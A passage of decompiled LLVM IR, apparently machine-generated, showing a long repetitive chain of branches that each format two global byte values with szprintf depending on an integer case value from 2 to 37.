  %v3_aa04 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aa10 = sext i8 %v3_a9f8 to i32
  %v6_aa10 = sext i8 %v3_aa04 to i32
  %v8_aa10 = call i32 @szprintf(i32 %v2_a9ec, i32 ptrtoint ([11 x i8]* @global_var_32628.86 to i32), i32 %v4_aa10, i32 %v6_aa10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa14

dec_label_pc_aa14:                                ; preds = %dec_label_pc_a9e0, %dec_label_pc_a9ec
  %v7_aa18 = icmp eq i32 %v2_a984, 2
  br i1 %v7_aa18, label %dec_label_pc_aa20, label %dec_label_pc_aa48

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa14
  %v2_aa20 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa2c = load i8, i8* @global_var_42c78.78, align 1
  %v3_aa38 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aa44 = sext i8 %v3_aa2c to i32
  %v6_aa44 = sext i8 %v3_aa38 to i32
  %v8_aa44 = call i32 @szprintf(i32 %v2_aa20, i32 ptrtoint ([14 x i8]* @global_var_32634.88 to i32), i32 %v4_aa44, i32 %v6_aa44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa48

dec_label_pc_aa48:                                ; preds = %dec_label_pc_aa14, %dec_label_pc_aa20
  %v7_aa4c = icmp eq i32 %v2_a984, 3
  br i1 %v7_aa4c, label %dec_label_pc_aa54, label %dec_label_pc_aa7c

dec_label_pc_aa54:                                ; preds = %dec_label_pc_aa48
  %v2_aa54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa60 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aa6c = load i8, i8* @global_var_42c79.79, align 1
  %v4_aa78 = sext i8 %v3_aa60 to i32
  %v6_aa78 = sext i8 %v3_aa6c to i32
  %v8_aa78 = call i32 @szprintf(i32 %v2_aa54, i32 ptrtoint ([14 x i8]* @global_var_32644.90 to i32), i32 %v4_aa78, i32 %v6_aa78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa7c

dec_label_pc_aa7c:                                ; preds = %dec_label_pc_aa48, %dec_label_pc_aa54
  %v7_aa80 = icmp eq i32 %v2_a984, 4
  br i1 %v7_aa80, label %dec_label_pc_aa88, label %dec_label_pc_aab0

dec_label_pc_aa88:                                ; preds = %dec_label_pc_aa7c
  %v2_aa88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aa94 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aaa0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aaac = sext i8 %v3_aa94 to i32
  %v6_aaac = sext i8 %v3_aaa0 to i32
  %v8_aaac = call i32 @szprintf(i32 %v2_aa88, i32 ptrtoint ([14 x i8]* @global_var_32654.92 to i32), i32 %v4_aaac, i32 %v6_aaac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aa7c, %dec_label_pc_aa88
  %v7_aab4 = icmp eq i32 %v2_a984, 5
  br i1 %v7_aab4, label %dec_label_pc_aabc, label %dec_label_pc_aae4

dec_label_pc_aabc:                                ; preds = %dec_label_pc_aab0
  %v2_aabc = ptrtoint i32* %stack_var_-36 to i32
  %v3_aac8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aad4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aae0 = sext i8 %v3_aac8 to i32
  %v6_aae0 = sext i8 %v3_aad4 to i32
  %v8_aae0 = call i32 @szprintf(i32 %v2_aabc, i32 ptrtoint ([13 x i8]* @global_var_32664.94 to i32), i32 %v4_aae0, i32 %v6_aae0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aae4

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aab0, %dec_label_pc_aabc
  %v7_aae8 = icmp eq i32 %v2_a984, 6
  br i1 %v7_aae8, label %dec_label_pc_aaf0, label %dec_label_pc_ab18

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aae4
  %v2_aaf0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aafc = load i8, i8* @global_var_42c78.78, align 1
  %v3_ab08 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ab14 = sext i8 %v3_aafc to i32
  %v6_ab14 = sext i8 %v3_ab08 to i32
  %v8_ab14 = call i32 @szprintf(i32 %v2_aaf0, i32 ptrtoint ([13 x i8]* @global_var_32674.96 to i32), i32 %v4_ab14, i32 %v6_ab14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab18

dec_label_pc_ab18:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aaf0
  %v7_ab1c = icmp eq i32 %v2_a984, 7
  br i1 %v7_ab1c, label %dec_label_pc_ab24, label %dec_label_pc_ab4c

dec_label_pc_ab24:                                ; preds = %dec_label_pc_ab18
  %v2_ab24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab30 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ab3c = load i8, i8* @global_var_42c79.79, align 1
  %v4_ab48 = sext i8 %v3_ab30 to i32
  %v6_ab48 = sext i8 %v3_ab3c to i32
  %v8_ab48 = call i32 @szprintf(i32 %v2_ab24, i32 ptrtoint ([14 x i8]* @global_var_32684.98 to i32), i32 %v4_ab48, i32 %v6_ab48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab4c

dec_label_pc_ab4c:                                ; preds = %dec_label_pc_ab18, %dec_label_pc_ab24
  %v7_ab50 = icmp eq i32 %v2_a984, 8
  br i1 %v7_ab50, label %dec_label_pc_ab58, label %dec_label_pc_ab80

dec_label_pc_ab58:                                ; preds = %dec_label_pc_ab4c
  %v2_ab58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab64 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ab70 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ab7c = sext i8 %v3_ab64 to i32
  %v6_ab7c = sext i8 %v3_ab70 to i32
  %v8_ab7c = call i32 @szprintf(i32 %v2_ab58, i32 ptrtoint ([14 x i8]* @global_var_32694.100 to i32), i32 %v4_ab7c, i32 %v6_ab7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab80

dec_label_pc_ab80:                                ; preds = %dec_label_pc_ab4c, %dec_label_pc_ab58
  %v7_ab84 = icmp eq i32 %v2_a984, 9
  br i1 %v7_ab84, label %dec_label_pc_ab8c, label %dec_label_pc_abb4

dec_label_pc_ab8c:                                ; preds = %dec_label_pc_ab80
  %v2_ab8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ab98 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aba4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_abb0 = sext i8 %v3_ab98 to i32
  %v6_abb0 = sext i8 %v3_aba4 to i32
  %v8_abb0 = call i32 @szprintf(i32 %v2_ab8c, i32 ptrtoint ([13 x i8]* @global_var_326a4.102 to i32), i32 %v4_abb0, i32 %v6_abb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abb4

dec_label_pc_abb4:                                ; preds = %dec_label_pc_ab80, %dec_label_pc_ab8c
  %v7_abb8 = icmp eq i32 %v2_a984, 10
  br i1 %v7_abb8, label %dec_label_pc_abc0, label %dec_label_pc_abe8

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abb4
  %v2_abc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_abcc = load i8, i8* @global_var_42c78.78, align 1
  %v3_abd8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_abe4 = sext i8 %v3_abcc to i32
  %v6_abe4 = sext i8 %v3_abd8 to i32
  %v8_abe4 = call i32 @szprintf(i32 %v2_abc0, i32 ptrtoint ([14 x i8]* @global_var_326b4.104 to i32), i32 %v4_abe4, i32 %v6_abe4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abe8

dec_label_pc_abe8:                                ; preds = %dec_label_pc_abb4, %dec_label_pc_abc0
  %v7_abec = icmp eq i32 %v2_a984, 11
  br i1 %v7_abec, label %dec_label_pc_abf4, label %dec_label_pc_ac1c

dec_label_pc_abf4:                                ; preds = %dec_label_pc_abe8
  %v2_abf4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac00 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ac0c = load i8, i8* @global_var_42c79.79, align 1
  %v4_ac18 = sext i8 %v3_ac00 to i32
  %v6_ac18 = sext i8 %v3_ac0c to i32
  %v8_ac18 = call i32 @szprintf(i32 %v2_abf4, i32 ptrtoint ([14 x i8]* @global_var_326c4.106 to i32), i32 %v4_ac18, i32 %v6_ac18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac1c

dec_label_pc_ac1c:                                ; preds = %dec_label_pc_abe8, %dec_label_pc_abf4
  %v7_ac20 = icmp eq i32 %v2_a984, 12
  br i1 %v7_ac20, label %dec_label_pc_ac28, label %dec_label_pc_ac50

dec_label_pc_ac28:                                ; preds = %dec_label_pc_ac1c
  %v2_ac28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac34 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ac40 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ac4c = sext i8 %v3_ac34 to i32
  %v6_ac4c = sext i8 %v3_ac40 to i32
  %v8_ac4c = call i32 @szprintf(i32 %v2_ac28, i32 ptrtoint ([14 x i8]* @global_var_326d4.108 to i32), i32 %v4_ac4c, i32 %v6_ac4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac50

dec_label_pc_ac50:                                ; preds = %dec_label_pc_ac1c, %dec_label_pc_ac28
  %v7_ac54 = icmp eq i32 %v2_a984, 13
  br i1 %v7_ac54, label %dec_label_pc_ac5c, label %dec_label_pc_ac84

dec_label_pc_ac5c:                                ; preds = %dec_label_pc_ac50
  %v2_ac5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac68 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ac74 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ac80 = sext i8 %v3_ac68 to i32
  %v6_ac80 = sext i8 %v3_ac74 to i32
  %v8_ac80 = call i32 @szprintf(i32 %v2_ac5c, i32 ptrtoint ([14 x i8]* @global_var_326e4.110 to i32), i32 %v4_ac80, i32 %v6_ac80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac84

dec_label_pc_ac84:                                ; preds = %dec_label_pc_ac50, %dec_label_pc_ac5c
  %v7_ac88 = icmp eq i32 %v2_a984, 14
  br i1 %v7_ac88, label %dec_label_pc_ac90, label %dec_label_pc_acb8

dec_label_pc_ac90:                                ; preds = %dec_label_pc_ac84
  %v2_ac90 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ac9c = load i8, i8* @global_var_42c78.78, align 1
  %v3_aca8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_acb4 = sext i8 %v3_ac9c to i32
  %v6_acb4 = sext i8 %v3_aca8 to i32
  %v8_acb4 = call i32 @szprintf(i32 %v2_ac90, i32 ptrtoint ([14 x i8]* @global_var_326f4.112 to i32), i32 %v4_acb4, i32 %v6_acb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acb8

dec_label_pc_acb8:                                ; preds = %dec_label_pc_ac84, %dec_label_pc_ac90
  %v7_acbc = icmp eq i32 %v2_a984, 15
  br i1 %v7_acbc, label %dec_label_pc_acc4, label %dec_label_pc_acec

dec_label_pc_acc4:                                ; preds = %dec_label_pc_acb8
  %v2_acc4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_acd0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_acdc = load i8, i8* @global_var_42c79.79, align 1
  %v4_ace8 = sext i8 %v3_acd0 to i32
  %v6_ace8 = sext i8 %v3_acdc to i32
  %v8_ace8 = call i32 @szprintf(i32 %v2_acc4, i32 ptrtoint ([14 x i8]* @global_var_32704.114 to i32), i32 %v4_ace8, i32 %v6_ace8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %dec_label_pc_acb8, %dec_label_pc_acc4
  %v7_acf0 = icmp eq i32 %v2_a984, 16
  br i1 %v7_acf0, label %dec_label_pc_acf8, label %dec_label_pc_ad20

dec_label_pc_acf8:                                ; preds = %dec_label_pc_acec
  %v2_acf8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad04 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ad10 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ad1c = sext i8 %v3_ad04 to i32
  %v6_ad1c = sext i8 %v3_ad10 to i32
  %v8_ad1c = call i32 @szprintf(i32 %v2_acf8, i32 ptrtoint ([14 x i8]* @global_var_32714.116 to i32), i32 %v4_ad1c, i32 %v6_ad1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_acec, %dec_label_pc_acf8
  %v7_ad24 = icmp eq i32 %v2_a984, 17
  br i1 %v7_ad24, label %dec_label_pc_ad2c, label %dec_label_pc_ad54

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad20
  %v2_ad2c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad38 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ad44 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ad50 = sext i8 %v3_ad38 to i32
  %v6_ad50 = sext i8 %v3_ad44 to i32
  %v8_ad50 = call i32 @szprintf(i32 %v2_ad2c, i32 ptrtoint ([14 x i8]* @global_var_32724.118 to i32), i32 %v4_ad50, i32 %v6_ad50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad54

dec_label_pc_ad54:                                ; preds = %dec_label_pc_ad20, %dec_label_pc_ad2c
  %v7_ad58 = icmp eq i32 %v2_a984, 18
  br i1 %v7_ad58, label %dec_label_pc_ad60, label %dec_label_pc_ad88

dec_label_pc_ad60:                                ; preds = %dec_label_pc_ad54
  %v2_ad60 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ad6c = load i8, i8* @global_var_42c78.78, align 1
  %v3_ad78 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ad84 = sext i8 %v3_ad6c to i32
  %v6_ad84 = sext i8 %v3_ad78 to i32
  %v8_ad84 = call i32 @szprintf(i32 %v2_ad60, i32 ptrtoint ([14 x i8]* @global_var_32734.120 to i32), i32 %v4_ad84, i32 %v6_ad84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad54, %dec_label_pc_ad60
  %v7_ad8c = icmp eq i32 %v2_a984, 19
  br i1 %v7_ad8c, label %dec_label_pc_ad94, label %dec_label_pc_adbc

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad88
  %v2_ad94 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ada0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_adac = load i8, i8* @global_var_42c79.79, align 1
  %v4_adb8 = sext i8 %v3_ada0 to i32
  %v6_adb8 = sext i8 %v3_adac to i32
  %v8_adb8 = call i32 @szprintf(i32 %v2_ad94, i32 ptrtoint ([14 x i8]* @global_var_32744.122 to i32), i32 %v4_adb8, i32 %v6_adb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ad88, %dec_label_pc_ad94
  %v7_adc0 = icmp eq i32 %v2_a984, 20
  br i1 %v7_adc0, label %dec_label_pc_adc8, label %dec_label_pc_adf0

dec_label_pc_adc8:                                ; preds = %dec_label_pc_adbc
  %v2_adc8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_add4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ade0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_adec = sext i8 %v3_add4 to i32
  %v6_adec = sext i8 %v3_ade0 to i32
  %v8_adec = call i32 @szprintf(i32 %v2_adc8, i32 ptrtoint ([14 x i8]* @global_var_32754.124 to i32), i32 %v4_adec, i32 %v6_adec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_adf0

dec_label_pc_adf0:                                ; preds = %dec_label_pc_adbc, %dec_label_pc_adc8
  %v7_adf4 = icmp eq i32 %v2_a984, 21
  br i1 %v7_adf4, label %dec_label_pc_adfc, label %dec_label_pc_ae24

dec_label_pc_adfc:                                ; preds = %dec_label_pc_adf0
  %v2_adfc = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae08 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ae14 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ae20 = sext i8 %v3_ae08 to i32
  %v6_ae20 = sext i8 %v3_ae14 to i32
  %v8_ae20 = call i32 @szprintf(i32 %v2_adfc, i32 ptrtoint ([14 x i8]* @global_var_32764.126 to i32), i32 %v4_ae20, i32 %v6_ae20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_adf0, %dec_label_pc_adfc
  %v7_ae28 = icmp eq i32 %v2_a984, 22
  br i1 %v7_ae28, label %dec_label_pc_ae30, label %dec_label_pc_ae58

dec_label_pc_ae30:                                ; preds = %dec_label_pc_ae24
  %v2_ae30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae3c = load i8, i8* @global_var_42c78.78, align 1
  %v3_ae48 = load i8, i8* @global_var_42c79.79, align 1
  %v4_ae54 = sext i8 %v3_ae3c to i32
  %v6_ae54 = sext i8 %v3_ae48 to i32
  %v8_ae54 = call i32 @szprintf(i32 %v2_ae30, i32 ptrtoint ([13 x i8]* @global_var_32774.128 to i32), i32 %v4_ae54, i32 %v6_ae54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae58

dec_label_pc_ae58:                                ; preds = %dec_label_pc_ae24, %dec_label_pc_ae30
  %v7_ae5c = icmp eq i32 %v2_a984, 23
  br i1 %v7_ae5c, label %dec_label_pc_ae64, label %dec_label_pc_ae8c

dec_label_pc_ae64:                                ; preds = %dec_label_pc_ae58
  %v2_ae64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae70 = load i8, i8* @global_var_42c78.78, align 1
  %v3_ae7c = load i8, i8* @global_var_42c79.79, align 1
  %v4_ae88 = sext i8 %v3_ae70 to i32
  %v6_ae88 = sext i8 %v3_ae7c to i32
  %v8_ae88 = call i32 @szprintf(i32 %v2_ae64, i32 ptrtoint ([13 x i8]* @global_var_32784.130 to i32), i32 %v4_ae88, i32 %v6_ae88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae58, %dec_label_pc_ae64
  %v7_ae90 = icmp eq i32 %v2_a984, 24
  br i1 %v7_ae90, label %dec_label_pc_ae98, label %dec_label_pc_aec0

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae8c
  %v2_ae98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aea4 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aeb0 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aebc = sext i8 %v3_aea4 to i32
  %v6_aebc = sext i8 %v3_aeb0 to i32
  %v8_aebc = call i32 @szprintf(i32 %v2_ae98, i32 ptrtoint ([13 x i8]* @global_var_32794.132 to i32), i32 %v4_aebc, i32 %v6_aebc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %dec_label_pc_ae8c, %dec_label_pc_ae98
  %v7_aec4 = icmp eq i32 %v2_a984, 25
  br i1 %v7_aec4, label %dec_label_pc_aecc, label %dec_label_pc_aef4

dec_label_pc_aecc:                                ; preds = %dec_label_pc_aec0
  %v2_aecc = ptrtoint i32* %stack_var_-36 to i32
  %v3_aed8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_aee4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aef0 = sext i8 %v3_aed8 to i32
  %v6_aef0 = sext i8 %v3_aee4 to i32
  %v8_aef0 = call i32 @szprintf(i32 %v2_aecc, i32 ptrtoint ([13 x i8]* @global_var_327a4.134 to i32), i32 %v4_aef0, i32 %v6_aef0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aef4

dec_label_pc_aef4:                                ; preds = %dec_label_pc_aec0, %dec_label_pc_aecc
  %v7_aef8 = icmp eq i32 %v2_a984, 26
  br i1 %v7_aef8, label %dec_label_pc_af00, label %dec_label_pc_af28

dec_label_pc_af00:                                ; preds = %dec_label_pc_aef4
  %v2_af00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af0c = load i8, i8* @global_var_42c78.78, align 1
  %v3_af18 = load i8, i8* @global_var_42c79.79, align 1
  %v4_af24 = sext i8 %v3_af0c to i32
  %v6_af24 = sext i8 %v3_af18 to i32
  %v8_af24 = call i32 @szprintf(i32 %v2_af00, i32 ptrtoint ([13 x i8]* @global_var_327b4.136 to i32), i32 %v4_af24, i32 %v6_af24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_aef4, %dec_label_pc_af00
  %v7_af2c = icmp eq i32 %v2_a984, 27
  br i1 %v7_af2c, label %dec_label_pc_af34, label %dec_label_pc_af5c

dec_label_pc_af34:                                ; preds = %dec_label_pc_af28
  %v2_af34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af40 = load i8, i8* @global_var_42c78.78, align 1
  %v3_af4c = load i8, i8* @global_var_42c79.79, align 1
  %v4_af58 = sext i8 %v3_af40 to i32
  %v6_af58 = sext i8 %v3_af4c to i32
  %v8_af58 = call i32 @szprintf(i32 %v2_af34, i32 ptrtoint ([13 x i8]* @global_var_327c4.138 to i32), i32 %v4_af58, i32 %v6_af58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %dec_label_pc_af28, %dec_label_pc_af34
  %v7_af60 = icmp eq i32 %v2_a984, 28
  br i1 %v7_af60, label %dec_label_pc_af68, label %dec_label_pc_af90

dec_label_pc_af68:                                ; preds = %dec_label_pc_af5c
  %v2_af68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af74 = load i8, i8* @global_var_42c78.78, align 1
  %v3_af80 = load i8, i8* @global_var_42c79.79, align 1
  %v4_af8c = sext i8 %v3_af74 to i32
  %v6_af8c = sext i8 %v3_af80 to i32
  %v8_af8c = call i32 @szprintf(i32 %v2_af68, i32 ptrtoint ([13 x i8]* @global_var_327d4.140 to i32), i32 %v4_af8c, i32 %v6_af8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af90

dec_label_pc_af90:                                ; preds = %dec_label_pc_af5c, %dec_label_pc_af68
  %v7_af94 = icmp eq i32 %v2_a984, 29
  br i1 %v7_af94, label %dec_label_pc_af9c, label %dec_label_pc_afc4

dec_label_pc_af9c:                                ; preds = %dec_label_pc_af90
  %v2_af9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_afa8 = load i8, i8* @global_var_42c78.78, align 1
  %v3_afb4 = load i8, i8* @global_var_42c79.79, align 1
  %v4_afc0 = sext i8 %v3_afa8 to i32
  %v6_afc0 = sext i8 %v3_afb4 to i32
  %v8_afc0 = call i32 @szprintf(i32 %v2_af9c, i32 ptrtoint ([13 x i8]* @global_var_327e4.142 to i32), i32 %v4_afc0, i32 %v6_afc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afc4

dec_label_pc_afc4:                                ; preds = %dec_label_pc_af90, %dec_label_pc_af9c
  %v7_afc8 = icmp eq i32 %v2_a984, 30
  br i1 %v7_afc8, label %dec_label_pc_afd0, label %dec_label_pc_aff8

dec_label_pc_afd0:                                ; preds = %dec_label_pc_afc4
  %v2_afd0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afdc = load i8, i8* @global_var_42c78.78, align 1
  %v3_afe8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_aff4 = sext i8 %v3_afdc to i32
  %v6_aff4 = sext i8 %v3_afe8 to i32
  %v8_aff4 = call i32 @szprintf(i32 %v2_afd0, i32 ptrtoint ([13 x i8]* @global_var_327f4.144 to i32), i32 %v4_aff4, i32 %v6_aff4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aff8

dec_label_pc_aff8:                                ; preds = %dec_label_pc_afc4, %dec_label_pc_afd0
  %v7_affc = icmp eq i32 %v2_a984, 31
  br i1 %v7_affc, label %dec_label_pc_b004, label %dec_label_pc_b02c

dec_label_pc_b004:                                ; preds = %dec_label_pc_aff8
  %v2_b004 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b010 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b01c = load i8, i8* @global_var_42c79.79, align 1
  %v4_b028 = sext i8 %v3_b010 to i32
  %v6_b028 = sext i8 %v3_b01c to i32
  %v8_b028 = call i32 @szprintf(i32 %v2_b004, i32 ptrtoint ([13 x i8]* @global_var_32804.146 to i32), i32 %v4_b028, i32 %v6_b028, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_aff8, %dec_label_pc_b004
  %v7_b030 = icmp eq i32 %v2_a984, 32
  br i1 %v7_b030, label %dec_label_pc_b038, label %dec_label_pc_b060

dec_label_pc_b038:                                ; preds = %dec_label_pc_b02c
  %v2_b038 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b044 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b050 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b05c = sext i8 %v3_b044 to i32
  %v6_b05c = sext i8 %v3_b050 to i32
  %v8_b05c = call i32 @szprintf(i32 %v2_b038, i32 ptrtoint ([13 x i8]* @global_var_32814.148 to i32), i32 %v4_b05c, i32 %v6_b05c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b060

dec_label_pc_b060:                                ; preds = %dec_label_pc_b02c, %dec_label_pc_b038
  %v7_b064 = icmp eq i32 %v2_a984, 33
  br i1 %v7_b064, label %dec_label_pc_b06c, label %dec_label_pc_b094

dec_label_pc_b06c:                                ; preds = %dec_label_pc_b060
  %v2_b06c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b078 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b084 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b090 = sext i8 %v3_b078 to i32
  %v6_b090 = sext i8 %v3_b084 to i32
  %v8_b090 = call i32 @szprintf(i32 %v2_b06c, i32 ptrtoint ([14 x i8]* @global_var_32824.150 to i32), i32 %v4_b090, i32 %v6_b090, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b094

dec_label_pc_b094:                                ; preds = %dec_label_pc_b060, %dec_label_pc_b06c
  %v7_b098 = icmp eq i32 %v2_a984, 34
  br i1 %v7_b098, label %dec_label_pc_b0a0, label %dec_label_pc_b0c8

dec_label_pc_b0a0:                                ; preds = %dec_label_pc_b094
  %v2_b0a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0ac = load i8, i8* @global_var_42c78.78, align 1
  %v3_b0b8 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b0c4 = sext i8 %v3_b0ac to i32
  %v6_b0c4 = sext i8 %v3_b0b8 to i32
  %v8_b0c4 = call i32 @szprintf(i32 %v2_b0a0, i32 ptrtoint ([14 x i8]* @global_var_32834.152 to i32), i32 %v4_b0c4, i32 %v6_b0c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0c8

dec_label_pc_b0c8:                                ; preds = %dec_label_pc_b094, %dec_label_pc_b0a0
  %v7_b0cc = icmp eq i32 %v2_a984, 35
  br i1 %v7_b0cc, label %dec_label_pc_b0d4, label %dec_label_pc_b0fc

dec_label_pc_b0d4:                                ; preds = %dec_label_pc_b0c8
  %v2_b0d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0e0 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b0ec = load i8, i8* @global_var_42c79.79, align 1
  %v4_b0f8 = sext i8 %v3_b0e0 to i32
  %v6_b0f8 = sext i8 %v3_b0ec to i32
  %v8_b0f8 = call i32 @szprintf(i32 %v2_b0d4, i32 ptrtoint ([14 x i8]* @global_var_32844.154 to i32), i32 %v4_b0f8, i32 %v6_b0f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0fc

dec_label_pc_b0fc:                                ; preds = %dec_label_pc_b0c8, %dec_label_pc_b0d4
  %v7_b100 = icmp eq i32 %v2_a984, 36
  br i1 %v7_b100, label %dec_label_pc_b108, label %dec_label_pc_b130

dec_label_pc_b108:                                ; preds = %dec_label_pc_b0fc
  %v2_b108 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b114 = load i8, i8* @global_var_42c78.78, align 1
  %v3_b120 = load i8, i8* @global_var_42c79.79, align 1
  %v4_b12c = sext i8 %v3_b114 to i32
  %v6_b12c = sext i8 %v3_b120 to i32
  %v8_b12c = call i32 @szprintf(i32 %v2_b108, i32 ptrtoint ([14 x i8]* @global_var_32854.156 to i32), i32 %v4_b12c, i32 %v6_b12c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b108
  %v7_b134 = icmp eq i32 %v2_a984, 37
  br i1 %v7_b134, label %dec_label_pc_b13c, label %dec_label_pc_b164

dec_label_pc_b13c:                                ; preds = %dec_label_pc_b130
  %v2_b13c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b148 = load i8, i8* @global_var_42c78.78, align 1
